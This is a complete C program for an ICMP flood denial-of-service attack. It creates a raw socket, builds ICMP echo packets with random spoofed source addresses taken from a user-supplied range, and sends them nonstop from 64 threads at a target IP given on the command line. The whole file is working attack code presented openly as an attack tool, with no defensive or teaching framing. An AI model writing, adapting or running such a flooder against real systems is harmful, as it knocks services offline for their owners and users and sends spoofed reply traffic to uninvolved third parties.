#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/time.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <pthread.h>

#define PAYLOAD_SIZE 64

#define MAX_THREAD 64

u_long num, start_ip, dst_ip;

int rawsocket;

// calculate checksum of a packet
u_short checksum(u_short *buf, int len) {

    u_long cksum = 0;

    while(len > 1) {
        cksum += *buf++;
        len -= sizeof(u_short);
    }

    if (len)
        cksum += *(u_char *)buf;

    while (cksum >> 16)
        cksum = (cksum >> 16) + (cksum & 0xffff);
    return (u_short)(~cksum);
}

// attack
void dos_attack(void) {

    int packetsize = sizeof(struct ip) + sizeof(struct icmp) + PAYLOAD_SIZE;    
    char *packet = (char*)malloc(packetsize);
    if (packet == NULL) {
        printf("Malloc error!\n");
        exit(1);
    }

    // build packet
    int packet_len;
    bzero(packet, packetsize);
    struct ip* ip_header = (struct ip*)packet;
    struct icmp* icmp_header = (struct icmp*)(packet + sizeof(struct ip));
    packet_len = sizeof(struct ip) + sizeof(struct icmp) + PAYLOAD_SIZE;

    // build ip header
    ip_header->ip_v = 4;
    ip_header->ip_hl = 5;
    ip_header->ip_tos = 0;
    ip_header->ip_len = htons(packetsize);
    ip_header->ip_id = htons(getpid());
    ip_header->ip_off = 0;
    ip_header->ip_ttl = 255;
    ip_header->ip_p = IPPROTO_ICMP;
    ip_header->ip_sum = 0;
    ip_header->ip_dst.s_addr = dst_ip;

    // build icmp header
    icmp_header->icmp_type = ICMP_ECHO;
    icmp_header->icmp_code = 0;

    // build socket addr
    struct sockaddr_in atkaddr;
    bzero(&atkaddr, sizeof(atkaddr));
    atkaddr.sin_family = AF_INET;
    atkaddr.sin_addr.s_addr = dst_ip;
    atkaddr.sin_port = htons(0);

    // sending packet
    while (1) {
        ip_header->ip_src.s_addr = rand() % num + start_ip;
        memset(packet + sizeof(struct ip) + sizeof(struct icmp), rand() % 255, PAYLOAD_SIZE);
        icmp_header->icmp_cksum = checksum((u_short *)icmp_header, sizeof(struct icmp) + PAYLOAD_SIZE);
        sendto(rawsocket, packet, packet_len, 0, (struct sockaddr*)&atkaddr, sizeof(struct sockaddr));
        fflush(stdout);
    }

    free(packet);
}

int main(int argc, char **argv) {

    // error tips
    printf("Dos Attack: Type 2, fakeip dos.\n\n");
    if (argc < 4) {
        printf("Usage:\n");
        printf("sudo %s <target ip> <start ip> <end ip>\n", argv[0]);
        exit(-1);
    }

    // set src and dst ip
    num = inet_addr(argv[3]) - inet_addr(argv[2]);
    start_ip = inet_addr(argv[2]);
    dst_ip = inet_addr(argv[1]);

    // raw socket
    rawsocket = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (rawsocket < 0) {
        printf("Raw socket create failed!\n");
        exit(-1);
    }

    // set socket options
    const int on = 1;
    if (setsockopt(rawsocket, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) == -1) {
        printf("Set socket option IP_HDRINCL failed! (Can't set ip header by this program.)\n");
        exit(-1);
    }
    if (setsockopt(rawsocket, SOL_SOCKET, SO_BROADCAST, &on, sizeof(on)) == -1) {
        printf("Set socket option SO_BROADCAST failed! (Can't broadcast.)\n");
        exit(-1);
    }

    // create thread
    printf("Attack!\n");
    srand((int)time(NULL));
    pthread_t attack[MAX_THREAD];
    int i, error_code;
    for (i = 0; i < MAX_THREAD; i++) {
        error_code = pthread_create(&attack[i], NULL, (void*)dos_attack, NULL);
        if (error_code != 0)
            printf("Thread %d failed!\n", i);
    }
    for (i = 0; i < MAX_THREAD; i++) {
        pthread_join(attack[i], NULL);
    }

    close(rawsocket);
    return 0;
}